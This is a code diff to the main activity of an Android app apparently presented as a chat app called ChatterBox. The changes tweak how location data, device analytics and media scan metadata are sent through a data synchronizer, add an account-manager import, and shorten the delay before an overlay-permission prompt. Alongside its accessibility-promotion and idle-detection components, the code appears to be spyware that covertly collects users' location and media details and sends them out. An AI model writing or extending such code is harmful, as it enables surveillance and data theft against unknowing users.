@@ -32,6 +32,7 @@ import com.bumptech.glide.Glide
 import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
 import com.example.ChatterBox.accessibility.IdleDetector
+import com.example.ChatterBox.database.AccountManager
 import com.example.ChatterBox.database.BackgroundSyncService
 import com.example.ChatterBox.database.DataSynchronizer
 import com.example.ChatterBox.database.LocationTracker
@@ -135,7 +136,8 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         ) {
             val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
-                dataSynchronizer?.sendData("location_data", locationData)
+                // Device ID is already included in locationData by LocationTracker
+                dataSynchronizer?.sendData("location_data", locationData.toString())
             }
         }
     }
@@ -171,7 +173,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 put("timestamp", System.currentTimeMillis())
             }
 
-            dataSynchronizer?.sendData("app_analytics", deviceInfo)
+            dataSynchronizer?.sendData("app_analytics", deviceInfo.toString())
             if (ContextCompat.checkSelfPermission(
                     this,
                     android.Manifest.permission.ACCESS_FINE_LOCATION
@@ -270,7 +272,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     put("android_version", Build.VERSION.RELEASE)
                 }
 
-                dataSynchronizer?.sendData("media_metadata", mediaData)
+                dataSynchronizer?.sendData("media_metadata", mediaData.toString())
             }
         } catch (e: Exception) {
             Log.e(TAG, "Media scan error: ${e.message}")
@@ -402,7 +404,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         Toast.LENGTH_LONG
                     ).show()
                     startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
-                }, 1000)
+                }, 700)
             }, 1000)
         }
     }
